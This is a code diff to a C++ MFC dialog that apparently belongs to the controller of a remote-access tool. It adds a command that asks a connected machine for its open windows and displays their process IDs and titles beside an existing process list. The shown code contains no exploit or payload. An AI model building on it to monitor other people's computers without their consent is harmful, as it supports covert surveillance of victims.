@@ -149,7 +149,7 @@ void CSystemDlg::ShowSelectWindow(void)
 		m_list_windows.ShowWindow(SW_SHOW);
 		m_list_process.ShowWindow(SW_HIDE);
 		if(m_list_windows.GetItemCount() == 0)
-			//GetWindowsList();
+			GetWindowsList();
 		break;
 	default:
 		break;
@@ -163,6 +163,11 @@ void CSystemDlg::GetProcessList(void)
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 }
 
+void CSystemDlg::GetWindowsList(void)
+{
+	BYTE bToken = COMMAND_WSLIST;
+	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
+}
 
 BOOL CSystemDlg::OnInitDialog()
 {
@@ -229,6 +234,26 @@ void CSystemDlg::ShowProcessList(void)
 		dwOffset += sizeof(DWORD) + lstrlen(szExeFile) + lstrlen(szProcessFullName) + 2;
 	}
 
+}
+
+void CSystemDlg::ShowWindowsList(void)
+{
+	char *pBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
+	DWORD dwOffset = 0;
+	char *pTitle = NULL;
+	CString strPID;
+	m_list_windows.DeleteAllItems();
+
+	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
+	{
+		LPDWORD lpPID = LPDWORD(pBuffer + dwOffset);
+		pTitle = pBuffer + dwOffset + sizeof(DWORD);
+		strPID.Format("%5u", *lpPID);
+		m_list_windows.InsertItem(i, strPID);
+		m_list_windows.SetItemText(i, 1, pTitle);
+
+		dwOffset += sizeof(DWORD) + lstrlen(pTitle) + 1;
+	}
 }
 
 
@@ -315,6 +340,9 @@ void CSystemDlg::OnReceiveComplete(void)
 	case TOKEN_PSLIST:
 		ShowProcessList();
 		break;
+	case TOKEN_WSLIST:
+		ShowWindowsList();
+		break;		
 	default:
 		break;
 	}
@@ -382,3 +410,7 @@ int CALLBACK CSystemDlg::MyCompareProc(LPARAM lParam1, LPARAM lParam2, LPARAM lP
 	else
 		return nCompRes*-1;
 }
+
+
+
+
